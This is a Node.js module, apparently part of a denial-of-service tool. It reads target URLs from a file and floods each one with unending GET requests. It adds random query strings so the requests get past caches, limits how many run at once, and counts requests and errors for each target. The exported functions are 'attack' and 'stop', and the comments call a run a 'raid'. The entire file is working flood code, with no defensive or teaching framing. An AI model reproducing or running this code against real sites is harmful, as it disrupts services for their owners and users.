require('dotenv').config();

//import fetch from 'node-fetch'

const fileHelper = require('../utils/fileHelper');
const settingsManager = require('../managers/settingsManager');
const {targetsPath} = require('../pathes');

let targetStats = {};
let queue = [];

var State = false;

async function fetchWithTimeout(resource, options) {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);

    return fetch(resource, {
        method: 'GET',
        mode: 'no-cors',
        signal: controller.signal
    }).then(response => {
        clearTimeout(id);
        return response;
    }).catch(error => {
        clearTimeout(id);
        throw error;
    })
}

async function flood(target) {
    try {
        for (let i = 0; State; ++i) {
            if (queue.length > Number(process.env.CONCURRENCY_LIMIT)) {
                await queue.shift();
            }

            const rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000);

            queue.push(
                fetchWithTimeout(target + rand, {timeout: Number(process.env.TIMEOUT)})
                    .catch(error => {
                        if (error.code === 20) {
                            return;
                        }

                        targetStats[target].number_of_errored_responses++;
                    })
                    .then(response => {
                        if (response && !response.ok) {
                            targetStats[target].number_of_errored_responses++;
                        }
                        targetStats[target].number_of_requests++;
                    })
            )
        }
    } catch (e) {
        throw e;
    }
}

//===============================================================================\\

async function attack() {
    startFlag();

    let targets = fileHelper.readSync(targetsPath);

    try {
        targets.forEach(target => {
            targetStats[target] = {number_of_requests: 0, number_of_errored_responses: 0}
        });

        targets.map(flood);
    } catch (e) {
        console.log(e.message);
    }
}

function stop() {
    stopFlag();
}

/**
 * Saves that raid was started in local variable State and settings.json
 */
function startFlag() {
    //settingsManager.setIsLaunched(true);
    State = true;
}

/**
 * Saves that raid was stopped in local variable State and settings.json
 */
function stopFlag() {
    //settingsManager.setIsLaunched(false);
    State = false;
}

module.exports = {attack, stop}
